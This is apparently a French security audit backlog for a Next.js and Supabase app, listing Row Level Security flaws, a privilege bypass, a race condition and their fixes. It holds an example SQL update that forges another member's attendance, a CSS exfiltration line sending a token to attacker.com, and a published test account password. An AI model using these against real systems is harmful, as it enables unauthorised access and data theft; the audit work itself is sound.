# INQFR — Backlog Sécurité

> Généré suite à l'audit sécurité du 2026-06-04.
> Stack : Next.js 16 App Router · TypeScript strict · Supabase (Auth + RLS) · pnpm

---

## Légende priorités

| Priorité | Signification |
|---|---|
| **HIGH** | Intégrité des données compromise — à traiter dans le prochain sprint |
| **MEDIUM** | Risque réel mais impact limité ou exploitation difficile |
| **LOW** | Bonne pratique / durcissement — traiter quand possible |
| **INFO** | À vérifier manuellement, pas de code à écrire |

---

## HIGH

### ~~SEC-A01 · RLS `event_attendees` — UPDATE sans `WITH CHECK` → falsification de présence~~ ✅ CORRIGÉ 2026-06-04

**Fichier :** `supabase/migrations/015_event_report.sql` ligne 13

**Problème :** La policy actuelle n'a pas de clause `WITH CHECK`. Via l'API Supabase REST (clé anon + JWT), n'importe quel membre peut faire :
```sql
UPDATE event_attendees SET profile_id = '<autre_uuid>' WHERE profile_id = '<moi>';
```
→ Forge la présence d'un autre membre à un événement, ou supprime silencieusement une inscription tierce.

**Fix :** Créer une migration `025_fix_attendees_rls.sql` :
```sql
DROP POLICY IF EXISTS "attendees_update" ON public.event_attendees;
CREATE POLICY "attendees_update" ON public.event_attendees
  FOR UPDATE TO authenticated
  USING  (profile_id = auth.uid() OR get_my_privilege() >= 300)
  WITH CHECK (profile_id = auth.uid() OR get_my_privilege() >= 300);
```

---

### ~~SEC-A02 · RLS `notifications` — INSERT `WITH CHECK (true)` → spam de notifications arbitraire~~ ✅ CORRIGÉ 2026-06-04

**Fichier :** `supabase/migrations/001_initial.sql` ligne 163

**Problème :**
```sql
CREATE POLICY "notifs_insert" ON public.notifications
  FOR INSERT TO authenticated WITH CHECK (true);
```
N'importe quel utilisateur authentifié peut insérer une notification avec un `profile_id` quelconque. Vecteur : spammer les notifications d'un autre membre ou injecter de fausses notifications de promotion/approbation.

**Fix :** Dans la même migration `025_fix_attendees_rls.sql` (ou une migration dédiée) :
```sql
DROP POLICY IF EXISTS "notifs_insert" ON public.notifications;
CREATE POLICY "notifs_insert" ON public.notifications
  FOR INSERT TO authenticated
  WITH CHECK (get_my_privilege() >= 300);
```

---

## MEDIUM

### ~~SEC-B01 · Route ICS — bypass du `min_privilege` des événements classifiés~~ ✅ CORRIGÉ 2026-06-04

**Fichier :** `app/api/evenements/[id]/ics/route.ts` lignes 38–45

**Problème :** La route vérifie l'auth mais pas le `min_privilege` de l'événement. La RLS `events` autorise SELECT pour tout membre authentifié. Un Aspirant peut donc exporter le `.ics` d'un événement réservé MI+ et en découvrir le titre, la description, le lieu et l'horaire.

**Fix :** Ajouter la vérification de privilege après avoir récupéré l'événement :
```typescript
const { data: privData } = await supabase.rpc('get_my_privilege')
const userPrivilege = (privData as number) ?? 0
if (userPrivilege < (event.min_privilege ?? 0))
  return new NextResponse('Forbidden', { status: 403 })
```

---

### ~~SEC-B02 · RLS `ships` — UPDATE sans `WITH CHECK` → transfert forcé de vaisseau~~ ✅ CORRIGÉ 2026-06-04

**Fichier :** `supabase/migrations/001_initial.sql` ligne 152

**Problème :** Sans `WITH CHECK`, un propriétaire peut changer `owner_id` vers n'importe quel autre membre → transfert de vaisseau non sollicité. Un Guardian+ peut changer `owner_id` de n'importe quel vaisseau sans contrainte sur la valeur finale.

**Fix :** Dans une migration de durcissement RLS :
```sql
DROP POLICY IF EXISTS "ships_update" ON public.ships;
CREATE POLICY "ships_update" ON public.ships
  FOR UPDATE TO authenticated
  USING  (owner_id = auth.uid() OR get_my_privilege() >= 300)
  WITH CHECK (owner_id = auth.uid() OR get_my_privilege() >= 300);
```

---

### ~~SEC-B03 · RLS `notifications` — UPDATE sans `WITH CHECK` → déplacement de notification~~ ✅ CORRIGÉ 2026-06-04

**Fichier :** `supabase/migrations/001_initial.sql` ligne 162

**Problème :** Un utilisateur peut UPDATE sa propre notification et changer `profile_id` → la notification apparaît dans la boîte d'un autre membre. Impact limité sur la confidentialité, mais compromet l'intégrité des compteurs non-lus.

**Fix :**
```sql
DROP POLICY IF EXISTS "notifs_update" ON public.notifications;
CREATE POLICY "notifs_update" ON public.notifications
  FOR UPDATE TO authenticated
  USING  (profile_id = auth.uid())
  WITH CHECK (profile_id = auth.uid());
```

---

### ~~SEC-B04 · TOCTOU — réservation d'inventaire non-atomique~~ ✅ CORRIGÉ 2026-06-04

**Fichiers :** `actions/operations.ts` lignes ~309–333 · `actions/logistics.ts` lignes ~224–228

**Problème :** La logique de réservation (lire stock → décider → insérer transaction → mettre à jour stock) est effectuée en 3 requêtes séquentielles sans transaction atomique. Deux requêtes concurrentes peuvent lire le même stock disponible et toutes deux réussir → sur-réservation.

**Fix :** Extraire la logique dans une fonction RPC `SECURITY DEFINER` utilisant `SELECT ... FOR UPDATE` ou un bloc transactionnel :
```sql
CREATE OR REPLACE FUNCTION reserve_inventory(
  p_item_id UUID, p_quantity INTEGER, p_operation_id UUID, p_requested_by UUID
) RETURNS JSONB LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
  v_available INTEGER;
BEGIN
  SELECT quantity - reserved_quantity INTO v_available
  FROM inventory_stock WHERE item_id = p_item_id FOR UPDATE;

  IF v_available < p_quantity THEN
    RETURN jsonb_build_object('success', false, 'error', 'Stock insuffisant');
  END IF;

  INSERT INTO inventory_transactions (...) VALUES (...);
  UPDATE inventory_stock SET reserved_quantity = reserved_quantity + p_quantity WHERE item_id = p_item_id;
  RETURN jsonb_build_object('success', true);
END;
$$;
```

---

## LOW

### ~~SEC-C01 · Route ICS — `isUUID` absent sur le paramètre `id`~~ ✅ CORRIGÉ 2026-06-04

**Fichier :** `app/api/evenements/[id]/ics/route.ts` ligne 35

**Problème :** Toutes les autres routes `[id]` du projet ont un guard `isUUID()` (P2-03 ✅). Cette route en est dépourvue — un `id` malformé traverse jusqu'à `.eq('id', id)`.

**Fix :**
```typescript
const { id } = await params
if (!isUUID(id)) return new NextResponse('Not found', { status: 404 })
```

---

### ~~SEC-C02 · CSP — `unsafe-inline` sur `style-src`~~ ✅ RISQUE DOCUMENTÉ 2026-06-04

**Fichier :** `proxy.ts` ligne ~10

**Problème :** `style-src 'self' 'unsafe-inline'` autorise tous les styles inline. Vecteur théorique : exfiltration de données via `background-image: url('https://attacker.com/?token=...')` dans une injection de style. Compromis pragmatique avec Tailwind v4.

**Fix envisageable :** Passer à `style-src 'self' 'nonce-${nonce}'` — nécessite de propager le nonce sur tous les éléments `<style>` inline générés par Tailwind. Effort élevé. Acceptable comme risque documenté si le CSP nonce sur les scripts reste strict.

---

### ~~SEC-C03 · Comptes de test potentiellement actifs en production~~ ✅ NON APPLICABLE — pas de prod 2026-06-04

**Fichier :** `scripts/seed-test-users.ts`

**Problème :** 7 comptes dont `test.sage@inqfr.test` (mot de passe public `TestINQFR2024!`, privilege 1000). Aucun guard anti-production dans le script.

**Action manuelle :** Supabase Dashboard → Authentication → Users → chercher `test.*@inqfr.test` et supprimer.

**Fix code :**
```typescript
if (!process.env.NEXT_PUBLIC_SUPABASE_URL?.includes('localhost') &&
    !process.env.NEXT_PUBLIC_SUPABASE_URL?.includes('127.0.0.1')) {
  throw new Error('Refusing to seed — non-local Supabase URL detected')
}
```

---

## INFORMATIF

### ~~SEC-I01 · Policies RLS héritées basées sur les anciens rôles `'admin'`/`'officer'`~~ ✅ FAUX POSITIF 2026-06-04

**Fichier :** `supabase/migrations/001_initial.sql` lignes 135, 139–141, 151–153, 156–158

**Problème :** Les policies `profiles_admin`, `events_*`, `ships_*`, `resources_*` de la migration initiale utilisent `p.role IN ('admin', 'officer')`. Après migration 003, ces rôles n'existent plus → les policies sont mortes. Si migration 004 les a bien DROP-pées, il n'y a pas de risque. Sinon, elles coexistent (OR-logique PostgreSQL) avec les nouvelles — et si un compte avait encore `role = 'admin'`, `profiles_admin FOR ALL` lui donnerait accès total sur tous les profils.

**Action :** Vérifier que `004_rls_events_privileges.sql` contient `DROP POLICY IF EXISTS` pour chacune de ces policies. Si non, créer une migration de nettoyage.

---

## Ce qui est correct — ne pas retoucher

| Zone | Verdict |
|---|---|
| Zod validation dans toutes les Server Actions | ✅ Systématique, avant toute opération DB |
| Vérifications de privilege côté serveur | ✅ Présentes sur toutes les mutations sensibles |
| `safeRedirect()` + validation du param `redirectTo` | ✅ Bloque redirections absolues et `//evil.com` |
| `console.log` dans `hangar-sync.ts` (SEC-04) | ✅ Tous encadrés par `NODE_ENV === 'development'` |
| CSP nonce par requête + `strict-dynamic` | ✅ Correct, `unsafe-eval` dev-only uniquement |
| Headers de sécurité dans `next.config.ts` | ✅ `X-Frame-Options DENY`, `nosniff`, `Referrer-Policy`, `Permissions-Policy` |
| `isUUID()` sur les 6 routes `[id]` app | ✅ (manque uniquement sur la route ICS — SEC-C01) |
| Auth sur tous les Route Handlers | ✅ Les 3 endpoints API vérifient `getUser()` |
| Clé `service_role` | ✅ Server-only, jamais exposée au client |
| Auth callback — échange de code Supabase | ✅ `?code=` et `?token_hash=` correctement passés au SDK |
| RLS `profiles_update` (auto-promotion) | ✅ Corrigé par migration 020 |

---

## Synthèse

| Sévérité | # | Items |
|---|---|---|
| High | 2 | SEC-A01 (attendees_update), SEC-A02 (notifications INSERT libre) |
| Medium | 4 | SEC-B01 (ICS bypass), SEC-B02 (ships sans WITH CHECK), SEC-B03 (notifs UPDATE), SEC-B04 (TOCTOU stock) |
| Low | 3 | SEC-C01 (isUUID ICS), SEC-C02 (CSP style), SEC-C03 (comptes test) |
| Informatif | 1 | SEC-I01 (policies obsolètes à vérifier) |
